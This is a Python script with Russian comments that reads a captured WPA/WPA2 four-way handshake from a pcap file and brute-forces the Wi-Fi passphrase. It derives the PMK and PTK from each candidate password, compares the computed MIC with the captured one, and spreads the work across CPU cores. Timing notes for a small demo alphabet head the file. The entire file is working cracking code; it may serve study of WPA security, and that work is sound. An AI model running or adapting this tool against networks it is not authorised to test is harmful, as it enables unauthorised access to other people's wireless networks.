# -*- coding: utf-8 -*-
'''
Алфавит : 'abcdef'
Длина пароля: 5
Результаты:
    мой ноутбук[cpu_num]   -> 53s, 50s, 57s, 53s
    мой ноутбук[cpu_num*2] -> 52s, 55s
    --------------------
    Kaggle CPU[cpu_num]    -> 9s, 9s
    Kaggle CPU[cpu_num*2]  -> 9s, 9s

'''

from scapy.all import rdpcap, EAPOL, Dot11, Raw
from binascii import hexlify, a2b_hex
from hashlib import pbkdf2_hmac, sha1
from hmac import new
from itertools import product
from functools import partial
from time import time
from os import cpu_count
from multiprocessing import Pool


def check(pkt, handshakes, bssid, cl):
    # Проверяем все ли пакеты на месте
    fNONCE = b'00'*32
    fMIC = b'00'*16

    if pkt.haslayer(EAPOL):
        __sn = pkt[Dot11].addr2
        __rc = pkt[Dot11].addr1
        to_DS = pkt.getlayer(Dot11).FCfield & 0x1 != 0
        from_DS = pkt.getlayer(Dot11).FCfield & 0x2 != 0

        if from_DS:
            nonce = hexlify(pkt.getlayer(Raw).load)[26:90]
            mic = hexlify(pkt.getlayer(Raw).load)[154:186]
            if nonce != fNONCE and mic == fMIC:
                bssid = __sn
                cl = __rc
                handshakes[0] = pkt
            elif (__sn == bssid and __rc == cl and
                    nonce != fNONCE and mic != fMIC):
                handshakes[2] = pkt

        elif to_DS:
            nonce = hexlify(pkt.getlayer(Raw).load)[26:90]
            mic = hexlify(pkt.getlayer(Raw).load)[154:186]

            if (__sn == cl and __rc == bssid and
                    nonce != fNONCE and mic != fMIC):
                handshakes[1] = pkt

            elif (__sn == cl and __rc == bssid and
                    nonce == fNONCE and mic != fMIC):
                handshakes[3] = pkt

    return bssid, cl


def organize(bssid, cl, handshakes):
    # Все нижеприведенный переменные принадлежат к классу 'bytes'
    __NULL_ = b"\x00"
    bssid = a2b_hex(bssid.replace(':', '').lower())
    cl = a2b_hex(cl.replace(':', '').lower())
    aNONCE = a2b_hex(hexlify(handshakes[0].getlayer(Raw).load)[26:90])
    cNONCE = a2b_hex(hexlify(handshakes[1].getlayer(Raw).load)[26:90])
    key_data = (min(bssid, cl) + max(bssid, cl) +
                min(aNONCE, cNONCE) + max(aNONCE, cNONCE))
    mic = hexlify(handshakes[1].getlayer(Raw).load)[154:186]
    version = chr(handshakes[1].getlayer(EAPOL).version).encode()
    eap_type = chr(handshakes[1].getlayer(EAPOL).type).encode()
    eap_len = chr(handshakes[1].getlayer(EAPOL).len).encode()

    payload = (a2b_hex(hexlify(version + eap_type + __NULL_ + eap_len +
               a2b_hex(hexlify(handshakes[1].getlayer(Raw).load)[:154]) +
               __NULL_ * 16 +
               a2b_hex(hexlify(handshakes[1].getlayer(Raw).load)[186:]))))

    return key_data, mic, payload


def customPRF512(key, A, B):
    blen = 64
    i = 0
    R = b''
    while i <= ((blen*8+159)//160):
        hmacsha1 = new(key, (A + b'\x00' + B + bytes([i])), sha1)
        i += 1
        R += hmacsha1.digest()
    return R[:blen]


def try_password(password, essid, key_data, payload, mic, length):
    pwd = ''.join(password[1])
    if password[0] % 400 == 0:
        print(f"Done {int(password[0] / length * 100): <2} % || {pwd}")
        print("--------------------------")
    pmk = pbkdf2_hmac('sha1', pwd.encode(), essid.encode(), 4096, 32)
    ptk = customPRF512(pmk, b"Pairwise key expansion", key_data)
    _mic_ = new(ptk[0:16], payload, sha1).hexdigest()[:32]
    _mic_ = _mic_.encode()
    if mic == _mic_:
        print('Пароль найден: ', pwd)
        return pwd
    return None


def main_app(essid, file_with_packets):
    cpu_num = cpu_count()
    print(' * Number of CPUs: ', cpu_num, '\n')
    packets = rdpcap(file_with_packets)
    handshakes = [0, 0, 0, 0]
    essid = essid
    bssid = ''
    cl = ''

    LATIN_LOWER = 'abcdefghijklmnopqrstuvwxyz'
    LATIN_UPPER = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    NUMBERS = '0123456789'
    CUSTOM = 'abcdef'

    characters = CUSTOM            # The characters of the password
    rep = 5                        # The length of the password
    length = len(characters)**rep  # The numbers of passwords to be generated

    print(f" * {length} passwords will be generated\n")

    words = product(characters, repeat=rep)
    passwords = []
    for i, pwd in enumerate(words):
        passwords.append((i, pwd))
    passwords = tuple(passwords)

    for pkt in packets:
        bssid, cl = check(pkt, handshakes, bssid, cl)

    if all(handshakes):
        print(" * The packets were successfully checked\n")

    key_data, mic, payload = organize(bssid, cl, handshakes)

    loop_func = partial(try_password, essid=essid,
                        key_data=key_data, payload=payload,
                        mic=mic, length=length)

    start = time()
    pool = Pool(processes=cpu_num)
    results = []
    try:
        for result in pool.imap_unordered(loop_func, passwords):
            if result:
                results.append(result)
                pool.terminate()
                break
    finally:
        pool.close()
        pool.join()

    end = time() - start
    print(f"It has taken {int(end)} seconds")


if __name__ == "__main__":
    main_app("My_ESSID", "shake.pcap")
